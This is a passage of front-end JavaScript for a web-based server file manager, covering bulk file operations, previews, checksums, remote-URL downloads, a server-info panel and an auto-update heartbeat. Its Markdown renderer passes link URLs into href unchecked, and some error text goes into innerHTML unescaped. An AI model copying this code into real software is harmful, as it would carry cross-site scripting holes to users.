    if(!confirm(`Extract "${name}"?`))return;
    af('zip_extract',{item_name:name});
  }else if(action==='tar-x'){
    if(!confirm(`Extract "${name}"?`))return;
    af('tar_extract',{item_name:name});
  }else if(action==='dup'){
    if(!confirm(`Duplicate "${name}"?`))return;
    af('duplicate',{item_name:name});
  }else if(action==='hash'){
    openHash(name);
  }else if(action==='open'){
    if(extra.isDir)location.href='?dir='+encodeURIComponent(CWD+'/'+name);
    else if(extra.raw)openPreview(extra.raw,extra.type||'text',name);
    else location.href='?edit='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD);
  }else if(action==='edit'){
    location.href='?edit='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD);
  }else if(action==='dl'){
    location.href=extra.raw+'&dl=1';
  }else if(action==='prev'){
    if(extra.raw&&extra.type)openPreview(extra.raw,extra.type,name);
  }else if(action==='path'){
    const p=CWD+'/'+name;
    navigator.clipboard.writeText(p).then(()=>toast('Path copied!'));
  }else if(action==='share'){
    openShareCreate(name);
  }else if(action==='perm'){
    openPerm(name,extra.perm||'');
  }else if(action==='dirsize'){
    calcDirSize(name,extra.trigger);
  }
}

document.addEventListener('click',e=>{
  const btn=e.target.closest('[data-a]');
  if(!btn)return;
  doAction(btn.dataset.a,btn.dataset.n,{raw:btn.dataset.raw,type:btn.dataset.type,isDir:btn.dataset.isdir==='1'});
});

/* ═══════════════════════════════════════
   KEYBOARD NAVIGATION
═══════════════════════════════════════ */
const tbody=document.querySelector('.ft tbody');
if(tbody){
  tbody.addEventListener('keydown',e=>{
    const rows=Array.from(tbody.querySelectorAll('tr[data-name]'));
    const cur=document.activeElement.closest('tr');
    const idx=cur?rows.indexOf(cur):-1;
    if(e.key==='ArrowDown'){e.preventDefault();const nx=rows[idx+1];if(nx)nx.focus();}
    else if(e.key==='ArrowUp'){e.preventDefault();const pr=rows[idx-1];if(pr)pr.focus();}
    else if(e.key==='Enter'&&cur){
      const isDir=cur.dataset.isdir==='1';
      const name=cur.dataset.name;
      if(isDir)location.href='?dir='+encodeURIComponent(CWD+'/'+name);
      else{const nc=cur.querySelector('.nc[data-preview]');if(nc)openPreview(nc.dataset.preview,nc.dataset.type,nc.dataset.fname);}
    }else if(e.key==='Delete'&&cur&&!RO){doAction('del',cur.dataset.name);}
  });
}

/* ═══════════════════════════════════════
   RIGHT-CLICK CONTEXT MENU (desktop)
═══════════════════════════════════════ */
const ctx=document.getElementById('ctx');
let ctxData={};
function showCtx(x,y,data){
  ctxData=data;
  document.getElementById('ctx-name').textContent=data.name;
  const isDir=data.isDir;const isRO=RO;
  // Show/hide items
  qs('ctx-open').style.display='flex';
  qs('ctx-edit').style.display=isDir?'none':'flex';
  qs('ctx-dl').style.display=isDir?'none':'flex';
  qs('ctx-prev').style.display=(data.raw&&!isDir)?'flex':'none';
  qs('ctx-hash').style.display=isDir?'none':'flex';
  qs('ctx-dup').style.display=(isDir||isRO)?'none':'flex';
  qs('ctx-share').style.display=(isDir||isRO)?'none':'flex';
  qs('ctx-dirsize').style.display=isDir?'flex':'none';
  qs('ctx-perm').style.display=isRO?'none':'flex';
  qs('ctx-ren').style.display=isRO?'none':'flex';
  qs('ctx-del').style.display=isRO?'none':'flex';
  // Position
  ctx.style.left=x+'px';ctx.style.top=y+'px';
  ctx.classList.add('open');
  // Adjust if off screen
  requestAnimationFrame(()=>{
    const r=ctx.getBoundingClientRect();
    if(r.right>window.innerWidth)ctx.style.left=(x-r.width)+'px';
    if(r.bottom>window.innerHeight)ctx.style.top=(y-r.height)+'px';
  });
}
function closeCtx(){ctx.classList.remove('open');}
function qs(id){return document.getElementById(id);}

document.addEventListener('contextmenu',e=>{
  const nc=e.target.closest('[data-ctx-name]');
  const row=e.target.closest('tr[data-name],.gi[data-name]');
  if(!nc&&!row){closeCtx();return;}
  e.preventDefault();
  const name=nc?nc.dataset.ctxName:row.dataset.name;
  const isDir=(nc?nc.dataset.ctxIsdir:row.dataset.isdir)==='1';
  const raw=nc?nc.dataset.ctxRaw:row.dataset.ctxRaw||'';
  const type=nc?nc.dataset.ctxType:row.dataset.type||'';
  const perm=(nc?nc.dataset.ctxPerm:row.dataset.ctxPerm)||'';
  showCtx(e.clientX,e.clientY,{name,isDir,raw,type,perm});
});
document.addEventListener('click',e=>{if(!e.target.closest('.ctx'))closeCtx();});
document.addEventListener('scroll',closeCtx,true);

// Context menu actions
qs('ctx-open')?.addEventListener('click',()=>{closeCtx();doAction('open',ctxData.name,ctxData);});
qs('ctx-edit')?.addEventListener('click',()=>{closeCtx();doAction('edit',ctxData.name);});
qs('ctx-dl')?.addEventListener('click',()=>{closeCtx();doAction('dl',ctxData.name,ctxData);});
qs('ctx-prev')?.addEventListener('click',()=>{closeCtx();doAction('prev',ctxData.name,ctxData);});
qs('ctx-path')?.addEventListener('click',()=>{closeCtx();doAction('path',ctxData.name);});
qs('ctx-hash')?.addEventListener('click',()=>{closeCtx();openHash(ctxData.name);});
qs('ctx-dup')?.addEventListener('click',()=>{closeCtx();doAction('dup',ctxData.name);});
qs('ctx-share')?.addEventListener('click',()=>{closeCtx();openShareCreate(ctxData.name);});
qs('ctx-dirsize')?.addEventListener('click',e=>{closeCtx();calcDirSize(ctxData.name,null);});
qs('ctx-perm')?.addEventListener('click',()=>{closeCtx();openPerm(ctxData.name,ctxData.perm);});
qs('ctx-ren')?.addEventListener('click',()=>{closeCtx();doAction('ren',ctxData.name);});
qs('ctx-del')?.addEventListener('click',()=>{closeCtx();doAction('del',ctxData.name);});

/* ═══════════════════════════════════════
   LONG-PRESS BOTTOM SHEET (mobile)
═══════════════════════════════════════ */
const shOv=document.getElementById('shOv');
const sheet=document.getElementById('sheet');
let lpTimer,lpActive=false,lpStartY=0;
function openSheet(name,isDir,raw,type,size){
  document.getElementById('sh-name').textContent=name;
  document.getElementById('sh-meta').textContent=isDir?'Directory':(size?formatBytes(size)+' · '+(type||'file'):type||'file');
  const g=document.getElementById('sh-grid');
  const btns=[
    {icon:'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>',label:'Open',cls:'',act:()=>doAction('open',name,{isDir,raw,type})},
    !isDir?{icon:'<path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>',label:'Edit',cls:'sh-blue',act:()=>doAction('edit',name)}:null,
    !isDir?{icon:'<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>',label:'Download',cls:'sh-blue',act:()=>{if(raw)location.href=raw+'&dl=1';}}:null,
    {icon:'<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',label:'Copy Path',cls:'',act:()=>{navigator.clipboard.writeText(CWD+'/'+name).then(()=>toast('Path copied!'));}},
    (!isDir&&['text','code','data','config','markdown'].includes(type))?{icon:'<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',label:'Copy Content',cls:'',act:()=>copyFileContent(name)}:null,
    !RO?{icon:'<circle cx="13.5" cy="6.5" r=".5"/><circle cx="17.5" cy="10.5" r=".5"/><circle cx="8.5" cy="7.5" r=".5"/><circle cx="6.5" cy="12.5" r=".5"/><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"/>',label:'Tag',cls:'',act:()=>openTag(name)}:null,
    !isDir?{icon:'<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',label:'Checksum',cls:'sh-purp',act:()=>openHash(name)}:null,
    !RO&&!isDir?{icon:'<circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>',label:'Share Link',cls:'',act:()=>openShareCreate(name)}:null,
    isDir?{icon:'<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>',label:'Calc Size',cls:'',act:()=>calcDirSize(name,null)}:null,
    !RO?{icon:'<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',label:'Permissions',cls:'',act:()=>openPerm(name,'')}:null,
    !RO&&!isDir?{icon:'<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',label:'Duplicate',cls:'sh-amb',act:()=>doAction('dup',name)}:null,
    !RO?{icon:'<polyline points="5 12 12 5 19 12"/><line x1="12" y1="5" x2="12" y2="19"/>',label:'Rename',cls:'sh-amb',act:()=>doAction('ren',name)}:null,
    !RO?{icon:'<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/>',label:'Delete',cls:'sh-red',act:()=>doAction('del',name)}:null,
  ].filter(Boolean);
  g.innerHTML=btns.map((b,i)=>`<button class="sh-btn ${b.cls}" id="shb${i}">${svgStr(b.icon)}<span>${b.label}</span></button>`).join('');
  btns.forEach((b,i)=>{document.getElementById('shb'+i)?.addEventListener('click',()=>{closeSheet();b.act();});});
  shOv.style.display='block';requestAnimationFrame(()=>sheet.classList.add('open'));
}
function closeSheet(){sheet.classList.remove('open');setTimeout(()=>shOv.style.display='none',320);}
function svgStr(inner){return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">${inner}</svg>`;}
shOv.addEventListener('click',closeSheet);
// Swipe down to close sheet
let shStartY=0;
sheet.addEventListener('touchstart',e=>{shStartY=e.touches[0].clientY;},{passive:true});
sheet.addEventListener('touchend',e=>{if(e.changedTouches[0].clientY-shStartY>60)closeSheet();},{passive:true});

// Detect long-press on file rows and grid items
function attachLongPress(el){
  el.addEventListener('touchstart',e=>{
    lpStartY=e.touches[0].clientY;lpActive=false;
    const row=el.closest('[data-name]');if(!row)return;
    lpTimer=setTimeout(()=>{
      lpActive=true;
      const name=row.dataset.name;
      const isDir=(row.dataset.isdir||'0')==='1';
      const raw=row.querySelector('[data-ctx-raw]')?.dataset.ctxRaw||'';
      const type=row.dataset.type||row.querySelector('[data-ctx-type]')?.dataset.ctxType||'';
      const size=parseInt(row.querySelector('.sz')?.textContent)||0;
      if(navigator.vibrate)navigator.vibrate(40);
      openSheet(name,isDir,raw,type,0);
    },550);
  },{passive:true});
  el.addEventListener('touchmove',e=>{
    if(Math.abs(e.touches[0].clientY-lpStartY)>10)clearTimeout(lpTimer);
  },{passive:true});
  el.addEventListener('touchend',()=>clearTimeout(lpTimer),{passive:true});
  el.addEventListener('touchcancel',()=>clearTimeout(lpTimer),{passive:true});
}
document.querySelectorAll('tr[data-name],.gi[data-name]').forEach(attachLongPress);

/* ═══════════════════════════════════════
   MULTI-SELECT & BULK
═══════════════════════════════════════ */
const checkAll=document.getElementById('checkAll');
const bulkBar=document.getElementById('bulkBar');
const bulkCount=document.getElementById('bulkCount');
const selStat=document.getElementById('selStat');
const selCount=document.getElementById('selCount');
function getChecks(){return Array.from(document.querySelectorAll('.item-ck'));}
function selNames(){return getChecks().filter(c=>c.checked).map(c=>c.value);}
function refreshBulk(){
  const sel=selNames();
  document.querySelectorAll('tr[data-name],.gi[data-name]').forEach(row=>{
    const cb=row.querySelector('.item-ck');row.classList.toggle('selected',!!(cb&&cb.checked));
  });
  if(sel.length>0){bulkBar.classList.add('show');if(bulkCount)bulkCount.textContent=sel.length+' selected';}
  else bulkBar.classList.remove('show');
  if(selStat){selStat.style.display=sel.length>0?'flex':'none';if(selCount)selCount.textContent=sel.length;}
}
checkAll?.addEventListener('change',()=>{getChecks().forEach(c=>c.checked=checkAll.checked);refreshBulk();});
document.addEventListener('change',e=>{if(e.target.classList.contains('item-ck'))refreshBulk();});
document.getElementById('bkDel')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;if(!confirm(`Delete ${s.length} item(s)?`))return;af('bulk_delete',{items:JSON.stringify(s)});});
document.getElementById('bkChmod')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;bulkChmodItems=s;document.getElementById('bcTitle').textContent=`Change Permissions - ${s.length} item(s)`;openMod('bulkChmodOv');});
let bulkChmodItems=[];
document.getElementById('bcApply')?.addEventListener('click',()=>{
  const perm=document.getElementById('bcPerm').value.trim();
  if(!/^[0-7]{3,4}$/.test(perm)){toast('Enter a valid permission (e.g. 755)');return;}
  af('bulk_chmod',{items:JSON.stringify(bulkChmodItems),perm});
});
document.getElementById('bcClose')?.addEventListener('click',()=>closeMod('bulkChmodOv'));
document.getElementById('bkZip')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;af('zip_create',{items:JSON.stringify(s)});});
document.getElementById('bkTar')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;af('tar_create',{items:JSON.stringify(s)});});
document.getElementById('bkCopy')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;const t=prompt('Copy to:',CWD);if(t)af('bulk_copy',{items:JSON.stringify(s),target:t.trim()});});
document.getElementById('bkMove')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;const t=prompt('Move to:',CWD);if(t)af('bulk_move',{items:JSON.stringify(s),target:t.trim()});});
document.getElementById('clipCopy')?.addEventListener('click',()=>{const s=selNames();if(!s.length){toast('Select at least one item first.');return;}af('copy_clipboard',{items:JSON.stringify(s)});});
document.getElementById('clipCut')?.addEventListener('click',()=>{const s=selNames();if(!s.length){toast('Select at least one item first.');return;}af('cut_clipboard',{items:JSON.stringify(s)});});
document.getElementById('clipPaste')?.addEventListener('click',()=>af('paste_clipboard',{}));

/* Grid click to preview */
document.getElementById('gvw')?.addEventListener('click',e=>{
  const gi=e.target.closest('.gi[data-preview]');
  if(!gi||e.target.classList.contains('item-ck'))return;
  openPreview(gi.dataset.preview,gi.dataset.type,gi.dataset.fname);
});

/* Name-cell click to preview */
document.addEventListener('click',e=>{
  const nc=e.target.closest('.nc[data-preview]');if(!nc)return;
  openPreview(nc.dataset.preview,nc.dataset.type,nc.dataset.fname);
});

/* ═══════════════════════════════════════
   PREVIEW MODAL
═══════════════════════════════════════ */
const prevOv=document.getElementById('prevOv');
const prevBody=document.getElementById('prevBody');
let mdRawText='',mdShowingSource=false;
function openPreview(url,type,fname){
  document.getElementById('prevName').textContent=fname;
  document.getElementById('prevDl').href=url+'&dl=1';
  prevBody.innerHTML='';
  const mdToggle=document.getElementById('prevMdToggle');mdToggle.style.display='none';
  if(type==='image'){const img=document.createElement('img');img.src=url;prevBody.appendChild(img);}
  else if(type==='video'){const v=document.createElement('video');v.src=url;v.controls=true;v.autoplay=true;prevBody.appendChild(v);}
  else if(type==='pdf'){const fr=document.createElement('iframe');fr.src=url;prevBody.appendChild(fr);}
  else if(['docx','xlsx','pptx'].includes((fname.split('.').pop()||'').toLowerCase())){
    const pre=document.createElement('pre');pre.textContent='Extracting Office content…';prevBody.appendChild(pre);
    fetch('?x=office_preview&f='+encodeURIComponent(fname)+'&dir='+encodeURIComponent(CWD)).then(r=>r.json()).then(d=>{pre.textContent=d.ok?(d.text||'No readable text was found in this document.'):d.error;}).catch(()=>{pre.textContent='Office preview is unavailable.';});
  }
  else if(type==='markdown'){
    mdShowingSource=false;document.getElementById('prevMdToggleLabel').textContent='View Source';mdToggle.style.display='';
    const div=document.createElement('div');div.className='md-render';div.innerHTML='Loading…';prevBody.appendChild(div);
    fetch(url).then(r=>r.text()).then(t=>{mdRawText=t.length>200000?t.slice(0,200000)+'\n…(truncated)':t;div.innerHTML=mdToHtml(mdRawText);}).catch(()=>{div.textContent='Could not load file.';});
  }
  else{const pre=document.createElement('pre');pre.textContent='Loading…';prevBody.appendChild(pre);fetch(url).then(r=>r.text()).then(t=>{pre.textContent=t.length>200000?t.slice(0,200000)+'\n…(truncated)':t;}).catch(()=>{pre.textContent='Could not load file.';});}
  prevOv.classList.add('open');
}
document.getElementById('prevMdToggle')?.addEventListener('click',()=>{
  mdShowingSource=!mdShowingSource;
  document.getElementById('prevMdToggleLabel').textContent=mdShowingSource?'View Rendered':'View Source';
  prevBody.innerHTML='';
  if(mdShowingSource){const pre=document.createElement('pre');pre.textContent=mdRawText;prevBody.appendChild(pre);}
  else{const div=document.createElement('div');div.className='md-render';div.innerHTML=mdToHtml(mdRawText);prevBody.appendChild(div);}
});
document.getElementById('prevClose')?.addEventListener('click',()=>{prevOv.classList.remove('open');prevBody.innerHTML='';});
prevOv.addEventListener('click',e=>{if(e.target===prevOv){prevOv.classList.remove('open');prevBody.innerHTML='';}});

/* Lightweight Markdown → HTML renderer (no external deps) */
function mdEsc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function mdInline(s){
  s=mdEsc(s);
  s=s.replace(/`([^`]+)`/g,'<code>$1</code>');
  s=s.replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>');
  s=s.replace(/__([^_]+)__/g,'<strong>$1</strong>');
  s=s.replace(/\*([^*]+)\*/g,'<em>$1</em>');
  s=s.replace(/(?<!_)_([^_]+)_(?!_)/g,'<em>$1</em>');
  s=s.replace(/~~([^~]+)~~/g,'<del>$1</del>');
  s=s.replace(/!\[([^\]]*)\]\(([^)]+)\)/g,'<img alt="$1" src="$2" style="max-width:100%">');
  s=s.replace(/\[([^\]]*)\]\(([^)]+)\)/g,'<a href="$2" target="_blank" rel="noopener">$1</a>');
  return s;
}
function mdToHtml(md){
  const lines=md.replace(/\r\n/g,'\n').split('\n');
  let html='',inCode=false,codeLang='',listType=null,inBlockquote=false;
  const closeList=()=>{if(listType){html+=listType==='ul'?'</ul>':'</ol>';listType=null;}};
  const closeQuote=()=>{if(inBlockquote){html+='</blockquote>';inBlockquote=false;}};
  for(let i=0;i<lines.length;i++){
    let line=lines[i];
    const fence=line.match(/^```(.*)$/);
    if(fence){
      if(!inCode){closeList();closeQuote();inCode=true;codeLang=fence[1].trim();html+='<pre><code>';}
      else{inCode=false;html+='</code></pre>';}
      continue;
    }
    if(inCode){html+=mdEsc(line)+'\n';continue;}
    if(/^\s*$/.test(line)){closeList();closeQuote();continue;}
    let m;
    if((m=line.match(/^(#{1,6})\s+(.*)$/))){closeList();closeQuote();const lvl=m[1].length;html+=`<h${lvl}>${mdInline(m[2])}</h${lvl}>`;continue;}
    if(/^\s*(-{3,}|\*{3,}|_{3,})\s*$/.test(line)){closeList();closeQuote();html+='<hr>';continue;}
    if((m=line.match(/^\s*>\s?(.*)$/))){closeList();if(!inBlockquote){html+='<blockquote>';inBlockquote=true;}html+=`<p>${mdInline(m[1])}</p>`;continue;}
    if((m=line.match(/^\s*[-*+]\s+(.*)$/))){closeQuote();if(listType!=='ul'){closeList();html+='<ul>';listType='ul';}html+=`<li>${mdInline(m[1])}</li>`;continue;}
    if((m=line.match(/^\s*\d+[.)]\s+(.*)$/))){closeQuote();if(listType!=='ol'){closeList();html+='<ol>';listType='ol';}html+=`<li>${mdInline(m[1])}</li>`;continue;}
    closeList();closeQuote();
    html+=`<p>${mdInline(line)}</p>`;
  }
  closeList();closeQuote();
  if(inCode)html+='</code></pre>';
  return html;
}

/* ═══════════════════════════════════════
   CHECKSUM MODAL
═══════════════════════════════════════ */
document.getElementById('hashClose')?.addEventListener('click',()=>closeMod('hashOv'));
async function openHash(filename){
  document.getElementById('hashTitle').textContent='Checksum - '+filename;
  document.getElementById('hashBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Computing…</div>';
  openMod('hashOv');
  try{
    const d=await fetch('?x=cs&f='+encodeURIComponent(filename)+'&dir='+encodeURIComponent(CWD)).then(r=>r.json());
    if(d.error){document.getElementById('hashBody').innerHTML='<div style="padding:20px;color:#fca5a5">'+d.error+'</div>';return;}
    document.getElementById('hashBody').innerHTML=`<div style="padding:16px">
      <div style="font-size:11px;color:var(--t2);margin-bottom:12px">Click any hash to copy</div>
      ${hr('MD5',d.md5)}${hr('SHA-1',d.sha1)}${hr('SHA-256',d.sha256)}
      <div class="hash-r"><div class="hash-l">File Size</div><div class="hash-v" style="color:var(--t1)">${formatBytes(d.size)}</div></div>
    </div>`;
    document.querySelectorAll('.hash-v[data-c]').forEach(el=>el.addEventListener('click',()=>{navigator.clipboard.writeText(el.dataset.c).then(()=>{const ov=el.innerHTML;el.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" style="width:12px;height:12px;vertical-align:-1px"><polyline points="20 6 9 17 4 12"/></svg> Copied!';el.style.color='#86efac';setTimeout(()=>{el.innerHTML=ov;el.style.color='';},1500);});}));
  }catch{document.getElementById('hashBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
}
function hr(l,h){return `<div class="hash-r"><div class="hash-l">${l}</div><div class="hash-v" data-c="${h}" title="Click to copy">${h}</div></div>`;}

async function copyFileContent(name){
  try{
    const url='?raw='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD);
    const txt=await fetch(url).then(r=>r.text());
    await navigator.clipboard.writeText(txt);
    toast('Content copied to clipboard!');
  }catch{toast('Failed to copy content.');}
}

/* ═══════════════════════════════════════
   TAGS / LABELS
═══════════════════════════════════════ */
const TAG_COLORS=['#ef4444','#f97316','#f59e0b','#22c55e','#06b6d4','#3b82f6','#8b5cf6','#ec4899'];
function openTag(name){
  document.getElementById('tagTitle').textContent='Tag - '+name;
  document.getElementById('tagItemName').value=name;
  document.getElementById('tagLabel').value='';
  const sw=document.getElementById('tagSwatches');
  sw.innerHTML=TAG_COLORS.map(c=>`<div class="tag-sw" data-c="${c}" style="width:26px;height:26px;border-radius:50%;background:${c};cursor:pointer;display:inline-block;margin:3px;border:2px solid transparent"></div>`).join('');
  let picked=TAG_COLORS[0];
  sw.querySelectorAll('.tag-sw').forEach(el=>{
    el.addEventListener('click',()=>{picked=el.dataset.c;sw.querySelectorAll('.tag-sw').forEach(e2=>e2.style.borderColor='transparent');el.style.borderColor='var(--t1)';});
  });
  sw.firstElementChild.style.borderColor='var(--t1)';
  document.getElementById('tagApply').onclick=()=>{af('set_tag',{item_name:name,color:picked,label:document.getElementById('tagLabel').value});};
  document.getElementById('tagRemove').onclick=()=>{af('remove_tag',{item_name:name});};
  openMod('tagOv');
}
document.getElementById('tagClose')?.addEventListener('click',()=>closeMod('tagOv'));

/* ═══════════════════════════════════════
   REMOTE URL DOWNLOAD
═══════════════════════════════════════ */
document.getElementById('remoteDlBtn')?.addEventListener('click',()=>{
  document.getElementById('rdUrl').value='';document.getElementById('rdName').value='';
  document.getElementById('rdCwd').textContent=CWD;
  openMod('remoteDlOv');
});
document.getElementById('remoteDlClose')?.addEventListener('click',()=>closeMod('remoteDlOv'));
document.getElementById('rdApply')?.addEventListener('click',()=>{
  const url=document.getElementById('rdUrl').value.trim();
  if(!/^https?:\/\//i.test(url)){toast('Enter a valid http(s) URL');return;}
  af('remote_download',{url,fname:document.getElementById('rdName').value.trim()});
});

/* ═══════════════════════════════════════
   ACTIVITY LOG
═══════════════════════════════════════ */
document.getElementById('actBtn')?.addEventListener('click',async()=>{
  openMod('actOv');
  document.getElementById('actBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const log=await fetch('?x=lg').then(r=>r.json());
    if(!log.length){document.getElementById('actBody').innerHTML='<div class="empty" style="padding:40px"><p>No activity yet.</p></div>';return;}
    const rows=log.map(e=>`<tr><td style="white-space:nowrap;color:var(--t3);font-family:\'JetBrains Mono\',monospace;font-size:10.5px">${new Date(e.time*1000).toLocaleString()}</td><td><span class="la ${e.action}">${e.action}</span></td><td style="color:var(--t2);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(e.user)}</td><td style="font-family:\'JetBrains Mono\',monospace;font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(e.detail)}">${esc(e.detail)}</td></tr>`).join('');
    document.getElementById('actBody').innerHTML=`<div style="overflow:auto;max-height:65vh"><table class="log-t"><thead><tr><th>Time</th><th>Action</th><th>User</th><th>Detail</th></tr></thead><tbody>${rows}</tbody></table></div>`;
  }catch{document.getElementById('actBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('actClose')?.addEventListener('click',()=>closeMod('actOv'));

/* ═══════════════════════════════════════
   SERVER INFO
═══════════════════════════════════════ */
document.getElementById('srvBtn')?.addEventListener('click',async()=>{
  openMod('srvOv');
  document.getElementById('srvBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await fetch('?x=sv').then(r=>r.json());
    document.getElementById('srvBody').innerHTML=`<div style="padding:16px">
      <div class="info-g">${[['Hostname',d.hostname||'-',''],['Server IP',d.server_ip||'-',''],['Client IP',d.client_ip||'-',''],['Uptime',d.uptime||'-',''],['CPU Cores',d.cpu_cores||'n/a',d.cpu_model||''],['CPU Load',d.load?d.load.join(' / '):'n/a','1m / 5m / 15m'],['RAM Usage',d.mem_pct!=null?d.mem_pct+'%':'n/a',d.mem_used?d.mem_used+' / '+d.mem_total:''],['PHP Version',d.php,'Runtime'],['OS',d.os,''],['Web Server',d.server,''],['SAPI',d.sapi,''],['Memory Limit',d.memory_limit,'Peak: '+d.mem_peak],['PHP Memory Usage',d.mem_usage,''],['Disk Total',d.disk_total,'Free: '+d.disk_free+' ('+d.disk_pct+'% used)'],['Upload Max',d.upload_max,'POST Max: '+d.post_max],['Max Exec',d.max_exec,''],['Timezone',d.tz,'']].map(([l,v,s])=>`<div class="info-c"><div class="info-cl">${l}</div><div class="info-cv">${esc(String(v))}</div>${s?`<div class="info-cs">${esc(s)}</div>`:''}</div>`).join('')}</div>
      <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:8px">Extensions (${d.exts.length})</div>
      <div class="ext-wrap">${d.exts.sort().map(e=>`<span class="ext-tag">${esc(e)}</span>`).join('')}</div>
    </div>`;
  }catch{document.getElementById('srvBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('srvClose')?.addEventListener('click',()=>closeMod('srvOv'));
document.querySelectorAll('.bs-click').forEach(el=>el.addEventListener('click',()=>document.getElementById('srvBtn')?.click()));

/* Live status-bar refresh: CPU load / RAM / disk every 6s, clock every 1s */
async function refreshStatusBar(){
  try{
    const d=await fetch('?x=svlite').then(r=>r.json());
    const dv=document.getElementById('sbDiskV');if(dv)dv.textContent=d.disk_pct+'%';
    const lv=document.getElementById('sbLoadV');if(lv&&d.load)lv.textContent=d.load.join(' ');
    const mv=document.getElementById('sbMemV');if(mv&&d.mem_pct!=null)mv.textContent=d.mem_pct+'%';
    const uv=document.getElementById('sbUptimeV');if(uv&&d.uptime){const h=Math.floor(d.uptime/3600),dd=Math.floor(d.uptime/86400);uv.textContent=dd>0?dd+'d '+(h%24)+'h':(h>0?h+'h '+Math.floor((d.uptime%3600)/60)+'m':Math.floor(d.uptime/60)+'m');}
  }catch{}
}
setInterval(refreshStatusBar,6000);
function tickClock(){const c=document.getElementById('clockEl');if(c)c.textContent=new Date().toLocaleTimeString('en-GB');}
setInterval(tickClock,1000);

/* ═══════════════════════════════════════
   FILE GUARDIAN — 30s heartbeat while a tab stays open (only active for
   admins; runs entirely client-side, disabled instantly if Guardian is off)
═══════════════════════════════════════ */
async function guardianHeartbeat(){
  try{
    const d=await fetch('?x=guardian_ping').then(r=>r.json());
    if(d&&d.applied){toast('Guardian applied an update — reloading…');setTimeout(()=>location.reload(),1200);}
  }catch{}
}
if(document.getElementById('guardBtn'))setInterval(guardianHeartbeat,30000);

/* Main-folder update check. It intentionally runs only when the manager is
   opened at its own root, so browsing a customer's nested folders never
   triggers a remote request. The server performs a check-only request and
   the admin decides whether to apply it from File Guardian. */
function guardianShowUpdateNotice(){
  if(document.getElementById('guardianUpdateNotice'))return;
  const content=document.getElementById('dropzone');
  if(!content)return;
  const notice=document.createElement('div');
  notice.id='guardianUpdateNotice';
  notice.className='alert warning';
  notice.setAttribute('role','status');
  notice.innerHTML='<svg viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><span>Guardian found a newer version of File Manager.</span><button type="button" class="btn btn-xs btn-g" style="margin-left:auto" id="guardianOpenUpdate">Review update</button><button type="button" class="alert-x" aria-label="Dismiss"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>';
  content.insertBefore(notice,content.firstChild);
  notice.querySelector('#guardianOpenUpdate')?.addEventListener('click',()=>{openMod('guardOv');guardLoad();});
